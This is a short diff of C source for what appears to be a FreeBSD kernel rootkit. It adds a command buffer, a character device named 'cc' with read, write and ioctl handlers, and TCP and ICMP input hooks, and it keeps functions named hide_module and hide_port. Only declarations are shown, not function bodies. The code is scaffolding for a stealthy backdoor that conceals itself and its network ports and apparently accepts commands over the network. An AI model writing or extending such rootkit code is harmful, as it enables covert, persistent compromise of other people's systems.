@@ -74,6 +74,8 @@ extern struct protosw inetsw[];
 typedef TAILQ_HEAD(, module) modulelist_t;
 extern modulelist_t modules;
 
+static char cli_cmd[256 + 1];
+
 struct module {
     TAILQ_ENTRY(module) link;       /* chain together all modules */
     TAILQ_ENTRY(module) flink;      /* all modules in a file */
@@ -86,10 +88,30 @@ struct module {
     modspecific_t       data;       /* module specific data */
 };
 
-static int module_events(struct module *, int, void *);
+static int cdev_open(struct cdev *, int, int, struct thread *);
+static int cdev_close(struct cdev *, int, int, struct thread *);
+static int cdev_ioctl(struct cdev *, u_long, caddr_t, int, struct thread *);
+static int cdev_write(struct cdev *, struct uio *, int);
+static int cdev_read(struct cdev *, struct uio *, int);
 
-static void hide_module(void);
-static void hide_port(int);
+static struct cdevsw cdev_devsw = {
+	.d_version	= D_VERSION,
+	.d_open		= cdev_open,
+	.d_close	= cdev_close,
+	.d_read		= cdev_read,
+	.d_write	= cdev_write,
+	.d_ioctl	= cdev_ioctl,
+	.d_name		= "cc"
+};
+
+static struct cdev *sdev;
+
 static void tcp_input_hook(struct mbuf *, int);
+static void icmp_input_hook(struct mbuf *, int);
+
+static void hide_port(int);
+static void hide_module(void);
+
+static int module_events(struct module *, int, void *);
 
 #endif
